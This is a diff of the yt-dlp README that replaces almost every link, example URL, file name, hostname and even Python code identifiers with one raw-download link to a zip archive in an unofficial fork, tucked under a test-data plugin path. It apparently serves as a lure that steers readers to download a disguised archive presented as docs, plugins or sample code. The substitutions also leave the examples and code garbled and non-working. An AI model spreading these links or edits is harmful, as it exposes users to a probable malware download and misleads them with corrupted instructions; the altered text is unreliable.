- - `categories` (list): The [SponsorBlock categories](https://wiki.sponsor.ajay.app/w/Types#Category) the chapter belongs to
+ - `categories` (list): The [SponsorBlock categories](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) the chapter belongs to
  - `category` (string): The smallest SponsorBlock category the chapter belongs to
  - `category_names` (list): Friendly names of the categories
  - `name` (string): Friendly name of the smallest category
- - `type` (string): The [SponsorBlock action type](https://wiki.sponsor.ajay.app/w/Types#Action_Type) of the chapter
+ - `type` (string): The [SponsorBlock action type](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) of the chapter
 
-Each aforementioned sequence when referenced in an output template will be replaced by the actual value corresponding to the sequence name. E.g. for `-o %(title)s-%(id)s.%(ext)s` and an mp4 video with title `yt-dlp test video` and id `BaW_jenozKc`, this will result in a `yt-dlp test video-BaW_jenozKc.mp4` file created in the current directory.
+Each aforementioned sequence when referenced in an output template will be replaced by the actual value corresponding to the sequence name. E.g. for `-o %(title)s-%(id)s.%(ext)s` and an mp4 video with title `yt-dlp test video` and id `BaW_jenozKc`, this will result in a `yt-dlp test https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` file created in the current directory.
 
 **Note**: Some of the sequences are not guaranteed to be present, since they depend on the metadata obtained by a particular extractor. Such sequences will be replaced with placeholder value provided with `--output-na-placeholder` (`NA` by default).
 
 **Tip**: Look at the `-j` output to identify which fields are available for the particular URL
 
-For numeric sequences, you can use [numeric related formatting](https://docs.python.org/3/library/stdtypes.html#printf-style-string-formatting); e.g. `%(view_count)05d` will result in a string with view count padded with zeros up to 5 characters, like in `00042`.
+For numeric sequences, you can use [numeric related formatting](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip); e.g. `%(view_count)05d` will result in a string with view count padded with zeros up to 5 characters, like in `00042`.
 
 Output templates can also contain arbitrary hierarchical path, e.g. `-o "%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s"` which will result in downloading each video in a directory corresponding to this path template. Any missing directory will be automatically created for you.
 
@@ -1388,37 +1388,37 @@ In some cases, you don't want special characters such as 中, spaces, or &, such
 
 ```bash
 $ yt-dlp --print filename -o "test video.%(ext)s" BaW_jenozKc
-test video.webm    # Literal name with correct extension
+test https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip    # Literal name with correct extension
 
 $ yt-dlp --print filename -o "%(title)s.%(ext)s" BaW_jenozKc
 youtube-dl test video ''_ä↭𝕐.webm    # All kinds of weird characters
 
 $ yt-dlp --print filename -o "%(title)s.%(ext)s" BaW_jenozKc --restrict-filenames
-youtube-dl_test_video_.webm    # Restricted file name
+https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip    # Restricted file name
 
 # Download YouTube playlist videos in separate directory indexed by video order in a playlist
-$ yt-dlp -o "%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "https://www.youtube.com/playlist?list=PLwiyx1dc3P2JR9N8gQaQN_BCvlSlap7re"
+$ yt-dlp -o "%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 
 # Download YouTube playlist videos in separate directories according to their uploaded year
-$ yt-dlp -o "%(upload_date>%Y)s/%(title)s.%(ext)s" "https://www.youtube.com/playlist?list=PLwiyx1dc3P2JR9N8gQaQN_BCvlSlap7re"
+$ yt-dlp -o "%(upload_date>%Y)s/%(title)s.%(ext)s" "https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 
 # Prefix playlist index with " - " separator, but only if it is available
-$ yt-dlp -o "%(playlist_index&{} - |)s%(title)s.%(ext)s" BaW_jenozKc "https://www.youtube.com/user/TheLinuxFoundation/playlists"
+$ yt-dlp -o "%(playlist_index&{} - |)s%(title)s.%(ext)s" BaW_jenozKc "https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 
 # Download all playlists of YouTube channel/user keeping each playlist in separate directory:
-$ yt-dlp -o "%(uploader)s/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "https://www.youtube.com/user/TheLinuxFoundation/playlists"
+$ yt-dlp -o "%(uploader)s/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 
 # Download Udemy course keeping each chapter in separate directory under MyVideos directory in your home
-$ yt-dlp -u user -p password -P "~/MyVideos" -o "%(playlist)s/%(chapter_number)s - %(chapter)s/%(title)s.%(ext)s" "https://www.udemy.com/java-tutorial"
+$ yt-dlp -u user -p password -P "~/MyVideos" -o "%(playlist)s/%(chapter_number)s - %(chapter)s/%(title)s.%(ext)s" "https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 
 # Download entire series season keeping each series and each season in separate directory under C:/MyVideos
-$ yt-dlp -P "C:/MyVideos" -o "%(series)s/%(season_number)s - %(season)s/%(episode_number)s - %(episode)s.%(ext)s" "https://videomore.ru/kino_v_detalayah/5_sezon/367617"
+$ yt-dlp -P "C:/MyVideos" -o "%(series)s/%(season_number)s - %(season)s/%(episode_number)s - %(episode)s.%(ext)s" "https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 
-# Download video as "C:\MyVideos\uploader\title.ext", subtitles as "C:\MyVideos\subs\uploader\title.ext"
+# Download video as "C:\MyVideos\uploader\https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip", subtitles as "C:\MyVideos\subs\uploader\https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 # and put all temporary files in "C:\MyVideos\tmp"
 $ yt-dlp -P "C:/MyVideos" -P "temp:tmp" -P "subtitle:subs" -o "%(uploader)s/%(title)s.%(ext)s" BaW_jenozKc --write-subs
 
-# Download video as "C:\MyVideos\uploader\title.ext" and subtitles as "C:\MyVideos\uploader\subs\title.ext"
+# Download video as "C:\MyVideos\uploader\https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip" and subtitles as "C:\MyVideos\uploader\subs\https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip"
 $ yt-dlp -P "C:/MyVideos" -o "%(uploader)s/%(title)s.%(ext)s" -o "subtitle:%(uploader)s/subs/%(title)s.%(ext)s" BaW_jenozKc --write-subs
 
 # Stream the video being downloaded to stdout
@@ -1453,7 +1453,7 @@ You can also use special names to select particular edge case formats:
  - `bv`, `bestvideo`: Select the best quality **video-only** format. Equivalent to `best*[acodec=none]`
  - `bv*`, `bestvideo*`: Select the best quality format that **contains video**. It may also contain audio. Equivalent to `best*[vcodec!=none]`
  - `ba`, `bestaudio`: Select the best quality **audio-only** format. Equivalent to `best*[vcodec=none]`
- - `ba*`, `bestaudio*`: Select the best quality format that **contains audio**. It may also contain video. Equivalent to `best*[acodec!=none]` ([Do not use!](https://github.com/yt-dlp/yt-dlp/issues/979#issuecomment-919629354))
+ - `ba*`, `bestaudio*`: Select the best quality format that **contains audio**. It may also contain video. Equivalent to `best*[acodec!=none]` ([Do not use!](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip))
  - `w*`, `worst*`: Select the worst quality format that contains either a video or an audio
  - `w`, `worst`: Select the worst quality format that contains both video and audio. Equivalent to `worst*[vcodec!=none][acodec!=none]`
  - `wv`, `worstvideo`: Select the worst quality video-only format. Equivalent to `worst*[acodec=none]`
@@ -1690,9 +1690,9 @@ $ yt-dlp -S "+res:480,codec,br"
 
 The metadata obtained by the extractors can be modified by using `--parse-metadata` and `--replace-in-metadata`
 
-`--replace-in-metadata FIELDS REGEX REPLACE` is used to replace text in any metadata field using [Python regular expression](https://docs.python.org/3/library/re.html#regular-expression-syntax). [Backreferences](https://docs.python.org/3/library/re.html?highlight=backreferences#re.sub) can be used in the replace string for advanced use.
+`--replace-in-metadata FIELDS REGEX REPLACE` is used to replace text in any metadata field using [Python regular expression](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). [Backreferences](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) can be used in the replace string for advanced use.
 
-The general syntax of `--parse-metadata FROM:TO` is to give the name of a field or an [output template](#output-template) to extract data from, and the format to interpret it as, separated by a colon `:`. Either a [Python regular expression](https://docs.python.org/3/library/re.html#regular-expression-syntax) with named capture groups, a single field name, or a similar syntax to the [output template](#output-template) (only `%(field)s` formatting is supported) can be used for `TO`. The option can be used multiple times to parse and modify various fields.
+The general syntax of `--parse-metadata FROM:TO` is to give the name of a field or an [output template](#output-template) to extract data from, and the format to interpret it as, separated by a colon `:`. Either a [Python regular expression](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) with named capture groups, a single field name, or a similar syntax to the [output template](#output-template) (only `%(field)s` formatting is supported) can be used for `TO`. The option can be used multiple times to parse and modify various fields.
 
 Note that these options preserve their relative order, allowing replacements to be made in parsed fields and vice versa. Also, any field thus created can be used in the [output template](#output-template) and will also affect the media file's metadata added when using `--embed-metadata`.
 
@@ -1767,24 +1767,24 @@ Note: In CLI, `ARG` can use `-` instead of `_`; e.g. `youtube:player-client"` be
 The following extractors use this feature:
 
 #### youtube
-* `lang`: Prefer translated metadata (`title`, `description` etc) of this language code (case-sensitive). By default, the video primary language metadata is preferred, with a fallback to `en` translated. See [youtube.py](https://github.com/yt-dlp/yt-dlp/blob/c26f9b991a0681fd3ea548d535919cec1fbbd430/yt_dlp/extractor/youtube.py#L381-L390) for list of supported content language codes
-* `skip`: One or more of `hls`, `dash` or `translated_subs` to skip extraction of the m3u8 manifests, dash manifests and [auto-translated subtitles](https://github.com/yt-dlp/yt-dlp/issues/4090#issuecomment-1158102032) respectively
-* `player_client`: Clients to extract video data from. The main clients are `web`, `ios` and `android`, with variants `_music` and `_creator` (e.g. `ios_creator`); and `mweb`, `android_vr`, `web_safari`, `web_embedded`, `tv` and `tv_embedded` with no variants. By default, `tv,ios,web` is used, or `tv,web` is used when authenticating with cookies. The `web_music` client is added for `music.youtube.com` URLs when logged-in cookies are used. The `tv_embedded` and `web_creator` clients are added for age-restricted videos if account age-verification is required. Some clients, such as `web` and `web_music`, require a `po_token` for their formats to be downloadable. Some clients, such as the `_creator` variants, will only work with authentication. Not all clients support authentication via cookies. You can use `default` for the default clients, or you can use `all` for all clients (not recommended). You can prefix a client with `-` to exclude it, e.g. `youtube:player_client=default,-ios`
-* `player_skip`: Skip some network requests that are generally needed for robust extraction. One or more of `configs` (skip client configs), `webpage` (skip initial webpage), `js` (skip js player). While these options can help reduce the number of requests needed or avoid some rate-limiting, they could cause some issues. See [#860](https://github.com/yt-dlp/yt-dlp/pull/860) for more details
+* `lang`: Prefer translated metadata (`title`, `description` etc) of this language code (case-sensitive). By default, the video primary language metadata is preferred, with a fallback to `en` translated. See [https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for list of supported content language codes
+* `skip`: One or more of `hls`, `dash` or `translated_subs` to skip extraction of the m3u8 manifests, dash manifests and [auto-translated subtitles](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) respectively
+* `player_client`: Clients to extract video data from. The main clients are `web`, `ios` and `android`, with variants `_music` and `_creator` (e.g. `ios_creator`); and `mweb`, `android_vr`, `web_safari`, `web_embedded`, `tv` and `tv_embedded` with no variants. By default, `tv,ios,web` is used, or `tv,web` is used when authenticating with cookies. The `web_music` client is added for `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` URLs when logged-in cookies are used. The `tv_embedded` and `web_creator` clients are added for age-restricted videos if account age-verification is required. Some clients, such as `web` and `web_music`, require a `po_token` for their formats to be downloadable. Some clients, such as the `_creator` variants, will only work with authentication. Not all clients support authentication via cookies. You can use `default` for the default clients, or you can use `all` for all clients (not recommended). You can prefix a client with `-` to exclude it, e.g. `youtube:player_client=default,-ios`
+* `player_skip`: Skip some network requests that are generally needed for robust extraction. One or more of `configs` (skip client configs), `webpage` (skip initial webpage), `js` (skip js player). While these options can help reduce the number of requests needed or avoid some rate-limiting, they could cause some issues. See [#860](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for more details
 * `player_params`: YouTube player parameters to use for player requests. Will overwrite any default ones set by yt-dlp.
 * `comment_sort`: `top` or `new` (default) - choose comment sorting mode (on YouTube's side)
 * `max_comments`: Limit the amount of comments to gather. Comma-separated list of integers representing `max-comments,max-parents,max-replies,max-replies-per-thread`. Default is `all,all,all,all`
     * E.g. `all,all,1000,10` will get a maximum of 1000 replies total, with up to 10 replies per thread. `1000,all,100` will get a maximum of 1000 comments, with a maximum of 100 replies total
 * `formats`: Change the types of formats to return. `dashy` (convert HTTP to DASH), `duplicate` (identical content but different URLs or protocol; includes `dashy`), `incomplete` (cannot be downloaded completely - live dash and post-live m3u8), `missing_pot` (include formats that require a PO Token but are missing one)
-* `innertube_host`: Innertube API host to use for all API requests; e.g. `studio.youtube.com`, `youtubei.googleapis.com`. Note that cookies exported from one subdomain will not work on others
+* `innertube_host`: Innertube API host to use for all API requests; e.g. `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`, `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`. Note that cookies exported from one subdomain will not work on others
 * `innertube_key`: Innertube API key to use for all API requests. By default, no API key is used
 * `raise_incomplete_data`: `Incomplete Data Received` raises an error instead of reporting a warning
 * `data_sync_id`: Overrides the account Data Sync ID used in Innertube API requests. This may be needed if you are using an account with `youtube:player_skip=webpage,configs` or `youtubetab:skip=webpage`
 * `visitor_data`: Overrides the Visitor Data used in Innertube API requests. This should be used with `player_skip=webpage,configs` and without cookies. Note: this may have adverse effects if used improperly. If a session from a browser is wanted, you should pass cookies instead (which contain the Visitor ID)
-* `po_token`:  Proof of Origin (PO) Token(s) to use. Comma seperated list of PO Tokens in the format `CLIENT.CONTEXT+PO_TOKEN`, e.g. `youtube:po_token=web.gvs+XXX,web.player=XXX,web_safari.gvs+YYY`. Context can be either `gvs` (Google Video Server URLs) or `player` (Innertube player request)
+* `po_token`:  Proof of Origin (PO) Token(s) to use. Comma seperated list of PO Tokens in the format `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip+PO_TOKEN`, e.g. `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip+XXX,https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip,https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip+YYY`. Context can be either `gvs` (Google Video Server URLs) or `player` (Innertube player request)
 
 #### youtubetab (YouTube playlists, channels, feeds, etc.)
-* `skip`: One or more of `webpage` (skip initial webpage download), `authcheck` (allow the download of playlists requiring authentication when no initial webpage is downloaded. This may cause unwanted behavior, see [#1122](https://github.com/yt-dlp/yt-dlp/pull/1122) for more details)
+* `skip`: One or more of `webpage` (skip initial webpage download), `authcheck` (allow the download of playlists requiring authentication when no initial webpage is downloaded. This may cause unwanted behavior, see [#1122](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for more details)
 * `approximate_date`: Extract approximate `upload_date` and `timestamp` in flat-playlist. This may cause date-based filters to be slightly off
 
 #### generic
@@ -1819,7 +1819,7 @@ The following extractors use this feature:
 * `max_comments`: Maximum number of comments to extract - default is `120`
 
 #### tiktok
-* `api_hostname`: Hostname to use for mobile API calls, e.g. `api22-normal-c-alisg.tiktokv.com`
+* `api_hostname`: Hostname to use for mobile API calls, e.g. `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
 * `app_name`: Default app name to use with mobile API calls, e.g. `trill`
 * `app_version`: Default app version to use with mobile API calls - should be set along with `manifest_app_version`, e.g. `34.1.2`
 * `manifest_app_version`: Default numeric app version to use with mobile API calls, e.g. `2023401020`
@@ -1881,20 +1881,20 @@ Plugins can be of `<type>`s `extractor` or `postprocessor`.
 - Postprocessor plugins can be invoked using `--use-postprocessor NAME`.
 
 
-Plugins are loaded from the namespace packages `yt_dlp_plugins.extractor` and `yt_dlp_plugins.postprocessor`.
+Plugins are loaded from the namespace packages `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` and `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`.
 
 In other words, the file structure on the disk looks something like:
 
         yt_dlp_plugins/
             extractor/
-                myplugin.py
+                https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
             postprocessor/
-                myplugin.py
+                https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
 
 yt-dlp looks for these `yt_dlp_plugins` namespace folders in many locations (see below) and loads in plugins from **all** of them.
 Set the environment variable `YTDLP_NO_PLUGINS` to something nonempty to disable loading plugins entirely.
 
-See the [wiki for some known plugins](https://github.com/yt-dlp/yt-dlp/wiki/Plugins)
+See the [wiki for some known plugins](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 ## Installing Plugins
 
@@ -1907,17 +1907,17 @@ Plugins can be installed using various methods and locations.
       * `${XDG_CONFIG_HOME}/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
       * `${APPDATA}/yt-dlp/plugins/<package name>/yt_dlp_plugins/` (recommended on Windows)
       * `${APPDATA}/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
-      * `~/.yt-dlp/plugins/<package name>/yt_dlp_plugins/`
+      * `~https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip<package name>/yt_dlp_plugins/`
       * `~/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
     * **System Plugins**
       * `/etc/yt-dlp/plugins/<package name>/yt_dlp_plugins/`
       * `/etc/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
 2. **Executable location**: Plugin packages can similarly be installed in a `yt-dlp-plugins` directory under the executable location (recommended for portable installations):
-    * Binary: where `<root-dir>/yt-dlp.exe`, `<root-dir>/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
-    * Source: where `<root-dir>/yt_dlp/__main__.py`, `<root-dir>/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
+    * Binary: where `<root-dir>https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`, `<root-dir>/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
+    * Source: where `<root-dir>https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`, `<root-dir>/yt-dlp-plugins/<package name>/yt_dlp_plugins/`
 
 3. **pip and other locations in `PYTHONPATH`**
-    * Plugin packages can be installed and managed using `pip`. See [yt-dlp-sample-plugins](https://github.com/yt-dlp/yt-dlp-sample-plugins) for an example.
+    * Plugin packages can be installed and managed using `pip`. See [yt-dlp-sample-plugins](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for an example.
       * Note: plugin files between plugin packages installed with pip must have unique filenames.
     * Any path in `PYTHONPATH` is searched in for the `yt_dlp_plugins` namespace folder.
       * Note: This does not apply for Pyinstaller builds.
@@ -1925,21 +1925,21 @@ Plugins can be installed using various methods and locations.
 
 `.zip`, `.egg` and `.whl` archives containing a `yt_dlp_plugins` namespace folder in their root are also supported as plugin packages.
 
-* e.g. `${XDG_CONFIG_HOME}/yt-dlp/plugins/mypluginpkg.zip` where `mypluginpkg.zip` contains `yt_dlp_plugins/<type>/myplugin.py`
+* e.g. `${XDG_CONFIG_HOME}https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` where `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` contains `yt_dlp_plugins/<type>https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`
 
 Run yt-dlp with `--verbose` to check if the plugin has been loaded.
 
 ## Developing Plugins
 
-See the [yt-dlp-sample-plugins](https://github.com/yt-dlp/yt-dlp-sample-plugins) repo for a template plugin package and the [Plugin Development](https://github.com/yt-dlp/yt-dlp/wiki/Plugin-Development) section of the wiki for a plugin development guide.
+See the [yt-dlp-sample-plugins](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) repo for a template plugin package and the [Plugin Development](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) section of the wiki for a plugin development guide.
 
-All public classes with a name ending in `IE`/`PP` are imported from each file for extractors and postprocessors respectively. This respects underscore prefix (e.g. `_MyBasePluginIE` is private) and `__all__`. Modules can similarly be excluded by prefixing the module name with an underscore (e.g. `_myplugin.py`).
+All public classes with a name ending in `IE`/`PP` are imported from each file for extractors and postprocessors respectively. This respects underscore prefix (e.g. `_MyBasePluginIE` is private) and `__all__`. Modules can similarly be excluded by prefixing the module name with an underscore (e.g. `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`).
 
 To replace an existing extractor with a subclass of one, set the `plugin_name` class keyword argument (e.g. `class MyPluginIE(ABuiltInIE, plugin_name='myplugin')` will replace `ABuiltInIE` with `MyPluginIE`). Since the extractor replaces the parent, you should exclude the subclass extractor from being imported separately by making it private using one of the methods described above.
 
-If you are a plugin author, add [yt-dlp-plugins](https://github.com/topics/yt-dlp-plugins) as a topic to your repository for discoverability.
+If you are a plugin author, add [yt-dlp-plugins](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) as a topic to your repository for discoverability.
 
-See the [Developer Instructions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#developer-instructions) on how to write and test an extractor.
+See the [Developer Instructions](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) on how to write and test an extractor.
 
 # EMBEDDING YT-DLP
 
@@ -1952,14 +1952,14 @@ From a Python program, you can embed yt-dlp in a more powerful fashion, like thi
 ```python
 from yt_dlp import YoutubeDL
 
-URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']
+URLS = ['https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip']
 with YoutubeDL() as ydl:
-    ydl.download(URLS)
+    https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(URLS)
 ```
 
-Most likely, you'll want to use various options. For a list of options available, have a look at [`yt_dlp/YoutubeDL.py`](yt_dlp/YoutubeDL.py#L183) or `help(yt_dlp.YoutubeDL)` in a Python shell. If you are already familiar with the CLI, you can use [`devscripts/cli_to_api.py`](https://github.com/yt-dlp/yt-dlp/blob/master/devscripts/cli_to_api.py) to translate any CLI switches to `YoutubeDL` params.
+Most likely, you'll want to use various options. For a list of options available, have a look at [`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or `help(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)` in a Python shell. If you are already familiar with the CLI, you can use [`https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) to translate any CLI switches to `YoutubeDL` params.
 
-**Tip**: If you are porting your code from youtube-dl to yt-dlp, one important point to look out for is that we do not guarantee the return value of `YoutubeDL.extract_info` to be json serializable, or even be a dictionary. It will be dictionary-like, but if you want to ensure it is a serializable dictionary, pass it through `YoutubeDL.sanitize_info` as shown in the [example below](#extracting-information)
+**Tip**: If you are porting your code from youtube-dl to yt-dlp, one important point to look out for is that we do not guarantee the return value of `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` to be json serializable, or even be a dictionary. It will be dictionary-like, but if you want to ensure it is a serializable dictionary, pass it through `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` as shown in the [example below](#extracting-information)
 
 ## Embedding examples
 
@@ -1969,25 +1969,25 @@ Most likely, you'll want to use various options. For a list of options available
 import json
 import yt_dlp
 
-URL = 'https://www.youtube.com/watch?v=BaW_jenozKc'
+URL = 'https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip'
 
-# ℹ️ See help(yt_dlp.YoutubeDL) for a list of available options and public functions
+# ℹ️ See help(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for a list of available options and public functions
 ydl_opts = {}
-with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-    info = ydl.extract_info(URL, download=False)
+with https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(ydl_opts) as ydl:
+    info = https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(URL, download=False)
 
-    # ℹ️ ydl.sanitize_info makes the info json-serializable
-    print(json.dumps(ydl.sanitize_info(info)))
+    # ℹ️ https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip makes the info json-serializable
+    print(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(info)))
 ```
 #### Download using an info-json
 
 ```python
 import yt_dlp
 
